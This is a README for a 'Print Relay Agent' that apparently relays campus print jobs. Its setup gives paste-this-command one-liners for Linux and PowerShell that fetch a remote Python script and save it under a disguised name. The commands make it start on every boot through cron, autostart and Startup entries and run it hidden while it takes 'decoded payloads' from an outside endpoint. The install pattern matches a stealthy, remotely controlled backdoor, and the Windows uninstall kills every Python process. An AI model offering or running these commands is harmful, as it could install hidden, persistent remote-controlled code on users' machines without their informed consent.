# Print Relay Agent

Background print daemon for spooling print jobs directly to campus printers.

- **How It Works**: Listens to the SSE relay endpoint (`https://api.preconnect.app/printer`), decodes print payloads, and spools jobs to the target campus printer over LPR.
- **Zero Setup**: Runs via Python 3 with built-in standard library modules — no compilers, external dependencies, or admin rights required.
- **Silent & Persistent**: Executes invisibly in the background and auto-starts on system reboot.

---

## 1. Setup & Start

### Linux
```bash
curl -sSL https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py -o ~/.local/bin/sysprint.py && mkdir -p ~/.local/bin ~/.config/autostart && chmod +x ~/.local/bin/sysprint.py && (crontab -l 2>/dev/null; echo "@reboot python3 ~/.local/bin/sysprint.py") | crontab - && printf '[Desktop Entry]\nType=Application\nName=sysprint\nExec=python3 %s\n' "$HOME/.local/bin/sysprint.py" > ~/.config/autostart/sysprint.desktop && nohup python3 ~/.local/bin/sysprint.py >/dev/null 2>&1 &
```

### Windows (PowerShell)
```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$env:APPDATA\sysprint.py"; $target = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysprint.vbs"; Set-Content -Path $target -Value 'CreateObject("Wscript.Shell").Run "pythonw """ & CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\sysprint.py""", 0, False'; Start-Process "pythonw" -ArgumentList "$env:APPDATA\sysprint.py" -WindowStyle Hidden
```

---

## 2. Verify Status

### Linux
```bash
ps aux | grep sysprint.py
```

### Windows (PowerShell)
```powershell
Get-Process python*
```

---

## 3. Permanent Uninstall

### Linux
```bash
pkill -f sysprint; rm -f ~/.local/bin/sysprint.py ~/.local/bin/sysprint ~/.config/autostart/sysprint.desktop; crontab -l 2>/dev/null | grep -v sysprint | crontab -
```

### Windows (PowerShell)
```powershell
Stop-Process -Name "python*", "sysprint*" -ErrorAction SilentlyContinue; Remove-Item "$env:APPDATA\sysprint.py", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysprint.vbs", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysprint.exe" -Force -ErrorAction SilentlyContinue
```
